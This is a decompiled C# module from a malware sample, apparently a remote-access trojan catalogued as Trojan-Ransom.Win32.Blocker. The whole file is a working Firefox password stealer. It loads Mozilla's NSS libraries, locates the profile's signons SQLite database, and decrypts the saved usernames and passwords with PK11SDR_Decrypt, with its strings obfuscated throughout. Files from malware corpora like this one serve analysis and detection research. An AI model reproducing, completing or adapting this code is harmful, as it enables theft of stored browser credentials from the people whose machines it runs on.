// Decompiled with JetBrains decompiler
// Type: OpenSource_RAT_Schäding.ff
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8170AD08-ABA5-4012-BCC7-4CC67D0071A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.ikxa-53f746507d13e73a4ea2419189ad7b0070faaf51b1e13192df858b42ac6c25c0.exe

using Microsoft.VisualBasic.CompilerServices;
using OpenSource_RAT_Schäding.SQLiteWrapper;
using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace OpenSource_RAT_Schäding
{
  [StandardModule]
  internal sealed class ff
  {
    private static IntPtr NSS3;
    public static string signon;

    public static void Main()
    {
      ff.sFirefox();
      Console.ReadLine();
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string dllFilePath);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public static long NSS_Init(string configdir)
    {
      string str = Environment.GetEnvironmentVariable(\u003F0\u003F.\u003F1\u003F("\\řɅ͎њՆً݃ࡍॏੇ\u0B52")) + \u003F0\u003F.\u003F1\u003F("MŝɠʹѤ\u0560٧ݫࠩॎ੮\u0B74ౠൢ\u0E6Cེၝ");
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("aŤɰͪѺճطܼࠪ१੮୭"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("gŻɷʹбԪ٧ݮ\u086D"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("xūɥ̱Ъէٮݭ"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("yŤɣ͵бԪ٧ݮ\u086D"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("xŹɼͼѮժضܪ\u0867८੭"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("xŻɥ͡ѳգضܪ\u0867८੭"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("bŸɹͼѼծ٪ܶࠪ१੮୭"));
      ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("\u007FŤɬͽѧլ٨ܶࠪ१੮୭"));
      ff.NSS3 = ff.LoadLibrary(str + \u003F0\u003F.\u003F1\u003F("fŴɵ̶Ъէٮݭ"));
      return ((ff.DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, \u003F0\u003F.\u003F1\u003F("FŔɕ͚эխ٫ݵ")), typeof (ff.DLLFunctionDelegate)))(configdir);
    }

    public static long PK11_GetInternalKeySlot() => ((ff.DLLFunctionDelegate2) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, \u003F0\u003F.\u003F1\u003F("GŝȤ̥ьՕٴݤࡆॠ\u0A79୩\u0C79\u0D64\u0E68ཤ၌ᅣቼፗᑯᕭᙵ")), typeof (ff.DLLFunctionDelegate2)))();

    public static long PK11_Authenticate(long slot, bool loadCerts, long wincx) => ((ff.DLLFunctionDelegate3) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, \u003F0\u003F.\u003F1\u003F("AśȾ̿ђՍپݾ\u0861७੩\u0B72౬൧\u0E62ྲྀၤ")), typeof (ff.DLLFunctionDelegate3)))(slot, loadCerts, wincx);

    public static int NSSBase64_DecodeBuffer(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen)
    {
      return ((ff.DLLFunctionDelegate4) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, \u003F0\u003F.\u003F1\u003F("Xņɇ͑ѳբٵܹ࠺॒ੈ୮౩൦\u0E6Cར၄ᅰቢ፥ᑧᕳ")), typeof (ff.DLLFunctionDelegate4)))(arenaOpt, outItemOpt, inStr, inLen);
    }

    public static int PK11SDR_Decrypt(ref ff.TSECItem data, ref ff.TSECItem result, int cx) => ((ff.DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(ff.GetProcAddress(ff.NSS3, \u003F0\u003F.\u003F1\u003F("_Ņȼ̽јՎٛݗࡃॣ੦\u0B76\u0C7A\u0D72\u0E75")), typeof (ff.DLLFunctionDelegate5)))(ref data, ref result, cx);

    public static string sFirefox()
    {
      string str1;
      try
      {
        Path.GetTempPath();
        bool flag = false;
        string str2 = Environment.GetEnvironmentVariable(\u003F0\u003F.\u003F1\u003F("\\řɅ͎њՆً݃ࡍॏੇ\u0B52")) + \u003F0\u003F.\u003F1\u003F("MŝɠʹѤ\u0560٧ݫࠩॎ੮\u0B74ౠൢ\u0E6Cེၝ");
        string[] directories = Directory.GetDirectories(Environment.GetEnvironmentVariable(\u003F0\u003F.\u003F1\u003F("FŖɕ̀тՖـ")) + \u003F0\u003F.\u003F1\u003F("EŕɸͬѼոٿݳࡍॖ੦\u0B7C౨൪\u0E64ིၕᅘት\u1369ᑣᕭᙯᝧᡲ"));
        int index1 = 0;
        while (index1 < directories.Length)
        {
          string str3 = directories[index1];
          if (!flag)
          {
            string[] files = Directory.GetFiles(str3);
            int index2 = 0;
            while (index2 < files.Length)
            {
              string input = files[index2];
              if (!flag)
              {
                if (Regex.IsMatch(input, \u003F0\u003F.\u003F1\u003F("}Ťɫͥѥէٻܩ\u0875ॴ੨୪\u0C76\u0D64")))
                {
                  ff.NSS_Init(str3);
                  ff.signon = input;
                }
                checked { ++index2; }
              }
              else
                break;
            }
            checked { ++index1; }
          }
          else
            break;
        }
        string signon = ff.signon;
        ff.TSECItem tsecItem = new ff.TSECItem();
        ff.TSECItem result1 = new ff.TSECItem();
        ff.TSECItem result2 = new ff.TSECItem();
        SQLiteBase sqLiteBase = new SQLiteBase(signon);
        DataTable dataTable = sqLiteBase.ExecuteQuery(\u003F0\u003F.\u003F1\u003F("Jŝɛ͓іՀسܸ࠱ॖ\u0A5Dୁీബ\u0E66ཥၳᅗቫ\u1369ᑢᕭ᙭\u1771ᠺ"));
        sqLiteBase.ExecuteQuery(\u003F0\u003F.\u003F1\u003F("sŚɒ͘џՏغܳ࠸॑\u0A44\u0B5Aౙള\u0E7Fཾၪᅐቪ፤ᑿᕪᙨᝥᡭᥣᩎ᭪ᱷᵷṱἺ"));
        ff.PK11_Authenticate(ff.PK11_GetInternalKeySlot(), true, 0L);
        string str4 = \u003F0\u003F.\u003F1\u003F("LŠɺ͢рժټܸ࠸ऺ");
        IEnumerator enumerator;
        try
        {
          enumerator = dataTable.Rows.GetEnumerator();
          while (enumerator.MoveNext())
          {
            DataRow current = (DataRow) enumerator.Current;
            string Left = Convert.ToString(current[\u003F0\u003F.\u003F1\u003F("kţɹͧњս٥ݫ\u086C॰\u0A56\u0B50్")].ToString());
            if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Left, \u003F0\u003F.\u003F1\u003F(""), false) != 0)
              str4 = str4 + Left + \u003F0\u003F.\u003F1\u003F("8ĸȺ");
            StringBuilder inStr1 = new StringBuilder(current[\u003F0\u003F.\u003F1\u003F("tžɬͼѴռٿݯ\u086Dढ़ੴୣ\u0C77൪\u0E62\u0F6Fၤ")].ToString());
            IntPtr num = new IntPtr(ff.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr1, inStr1.Length));
            ff.TSECItem structure1 = (ff.TSECItem) Marshal.PtrToStructure(num, typeof (ff.TSECItem));
            if (ff.PK11SDR_Decrypt(ref structure1, ref result1, 0) == 0 && result1.SECItemLen != 0)
            {
              byte[] numArray = new byte[checked (result1.SECItemLen - 1 + 1)];
              num = new IntPtr(result1.SECItemData);
              Marshal.Copy(num, numArray, 0, result1.SECItemLen);
              str4 = str4 + Encoding.ASCII.GetString(numArray) + \u003F0\u003F.\u003F1\u003F("8ĸȺ");
            }
            StringBuilder inStr2 = new StringBuilder(current[\u003F0\u003F.\u003F1\u003F("tžɬͼѴռٿݯ\u086Dक़੦\u0B75\u0C76\u0D73\u0E6C\u0F70ၥ")].ToString());
            num = new IntPtr(ff.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr2, inStr2.Length));
            ff.TSECItem structure2 = (ff.TSECItem) Marshal.PtrToStructure(num, typeof (ff.TSECItem));
            if (ff.PK11SDR_Decrypt(ref structure2, ref result2, 0) == 0 && result2.SECItemLen != 0)
            {
              byte[] numArray = new byte[checked (result2.SECItemLen - 1 + 1)];
              num = new IntPtr(result2.SECItemData);
              Marshal.Copy(num, numArray, 0, result2.SECItemLen);
              str4 = str4 + Encoding.ASCII.GetString(numArray) + \u003F0\u003F.\u003F1\u003F("+ĵȵͳЧյٌݠ\u087Aॢੀ୪\u0C7Cസุ༺");
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable _)
            (enumerator as IDisposable).Dispose();
        }
        str1 = str4;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = (string) null;
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public class SHITEMID
    {
      public static long cb;
      public static byte[] abID;

      [DebuggerNonUserCode]
      public SHITEMID()
      {
      }
    }

    public struct TSECItem
    {
      public int SECItemType;
      public int SECItemData;
      public int SECItemLen;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate2();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(ref ff.TSECItem data, ref ff.TSECItem result, int cx);
  }
}
